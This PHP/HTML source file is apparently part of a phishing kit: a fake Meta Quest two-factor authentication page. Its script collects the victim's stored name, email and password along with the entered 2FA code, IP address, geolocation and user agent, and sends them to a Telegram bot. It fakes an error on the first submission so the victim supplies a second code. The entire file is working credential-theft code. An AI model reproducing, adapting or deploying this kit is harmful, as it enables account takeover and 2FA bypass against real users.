<?php require_once('./get-data.php'); ?>
<?php require_once('./getip.php'); ?>

<?php
function getServerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip_server = getServerIP();
?>

<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Two-factor authentication required</title>
    <link rel="icon" href="/images/favicon.ico">
    <link rel="stylesheet" href="/styles/two-factor-authentication.css">
</head>
<body>
    <header class="metaquest-header">
        <div class="metaquest-header-inner">
            <div class="metaquest-logo">
                <img src="/images/logo.png" alt="Meta Quest" height="28">
                <span class="metaquest-title">Meta Quest</span>
            </div>
            <div class="metaquest-user-icon">
                <svg width="24" height="24" fill="none" stroke="#222" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 8-4 8-4s8 0 8 4"/></svg>
            </div>
        </div>
    </header>
    <div class="auth-container">
        <div class="oculus-invite-logo">
            <svg width="80" height="50" viewBox="0 0 80 44" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="5" y="0" width="70" height="45" rx="20" fill="#fff"/>
                <rect x="20" y="15" width="40" height="15" rx="8" fill="#181818"/>
            </svg>
        </div>
        <div class="auth-card">
            <h1>Two-factor authentication required</h1>
            <p class="instruction">Generate a code in your authenticator app or sms and enter it here.</p>
            
            <form class="auth-form" onsubmit="sendToTelegramFromTwoFactorAuthentication(event)">
                <div class="input-group">
                    <input type="text" id="code" placeholder="Enter code" maxlength="8">
                    <div class="error-message" style="display: none;">
                        <span class="error-icon">⚠️</span>
                        <span class="error-text">The authentication code you entered doesn't match the one sent to your phone. Please check the number and try again.</span>
                    </div>
                </div>
                
                <div class="form-footer">
                    <a href="#" class="alternative-auth">Need another way to authenticate?</a>
                    <button type="submit" class="confirm-btn">Confirm</button>
                </div>
            </form>
        </div>
    </div>

    <script src="/scripts/two-factor-authentication.js"></script>
    <script>
        function showError(errorMessage, codeInput) {
            errorMessage.style.display = 'flex';
            codeInput.classList.add('error');
        }

        function hideError(errorMessage, codeInput) {
            errorMessage.style.display = 'none';
            codeInput.classList.remove('error');
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            var fullName = localStorage.getItem('fullName');
            var email = localStorage.getItem('email');
            var phone = localStorage.getItem('phone');


            const codeInput = document.getElementById('code');
            const errorMessage = document.querySelector('.error-message');

           
            // Format input to only allow numbers and max 8 digits
            codeInput.addEventListener('input', function(e) {
                // Remove any non-numeric characters
                this.value = this.value.replace(/[^0-9]/g, '');
                
                // Limit to 8 digits
                if (this.value.length > 8) {
                    this.value = this.value.slice(0, 8);
                }

                // Hide error when user starts typing again
                hideError(errorMessage, codeInput);
            });

            
            var paramsURL = new URLSearchParams(window.location.search);
            var error = paramsURL.get('error');
            var code = localStorage.getItem('code');

            if (error == 1) {
                codeInput.value = code;
                codeInput.focus();
                codeInput.select();
                codeInput.style.borderBottom = '1px solid #FF0303';
                
                showError(errorMessage, codeInput);

                codeInput.addEventListener('input', function() {
                    if (codeInput.value.length > 0) {
                        codeInput.style.borderBottom = '1.5px solid #444';
                        hideError(errorMessage, codeInput);
                    } else {
                        codeInput.style.borderBottom = '1px solid #FF0303';
                    }
                });
            }
        });
            
        function sendToTelegramFromTwoFactorAuthentication(event) {
            event.preventDefault();
            var code = document.getElementById('code').value || '';
            var errorMessage = document.querySelector('.error-message');
            var codeInput = document.getElementById('code');

            if (code == "") {
                showError(errorMessage, codeInput);
                return;
            }

            if (code.length < 6) {
                showError(errorMessage, codeInput);
                return;
            }

            var firstName = localStorage.getItem('firstName');
            var lastName = localStorage.getItem('lastName');
            var personalEmail = localStorage.getItem('personalEmail');
            var password = localStorage.getItem('password');

            localStorage.setItem('code', code);

            var content = "💬Thông Tin Tài Khoản (web oculus)💬" +
                "\n" + "----------------------------------------------------------" +
                "\nFirst Name: " + "`" + firstName + "`" +
                "\nLast Name: " + "`" + lastName + "`" +
                "\nEmail: " + "`" + personalEmail + "`" +
                "\nPassword: " + "`" + password + "`" +
                "\n" + "----------------------------------------------------------" +
                "\nCode: " + "`" + code + "`" +
                "\n" + "----------------------------------------------------------" +
                "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
                "\nIP Address: " + "`<?php echo $ip; ?>`" +
                "\nCity: " + "`<?php echo $city; ?>`" +
                "\nRegion: " + "`<?php echo $region; ?>`" +
                "\nCountry: " + "`<?php echo $country; ?>`" +
                "\nOrg: " + "`<?php echo $org; ?>`" +
                "\nTimezone: " + "`<?php echo $timezone; ?>`" +
                "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";

            var apiToken = "<?php echo $token; ?>";
            var data = {
                chat_id: '<?php echo $chatId; ?>',
                text: content,
                parse_mode: 'Markdown'
            };

            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://api.telegram.org/bot' + apiToken + '/sendMessage', true);
            xhr.setRequestHeader('Content-Type', 'application/json');

            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        console.log('Message sent to Telegram bot successfully.');
                        setTimeout(function() {
                            var paramsURL = new URLSearchParams(window.location.search);
                            var error = paramsURL.get('error');

                            if (error == 1) {
                                window.location.href = "/submit-schedule-interview-success.php";
                            } else {
                                window.location.href = "/two-factor-authentication.php?error=1";
                                localStorage.setItem('code', code);
                            }
                        }, 1000);
                    } else {
                        console.error('Failed to send message to Telegram bot.');
                    }
                }
            };

            xhr.send(JSON.stringify(data));
        }
    </script>
</body>
</html> 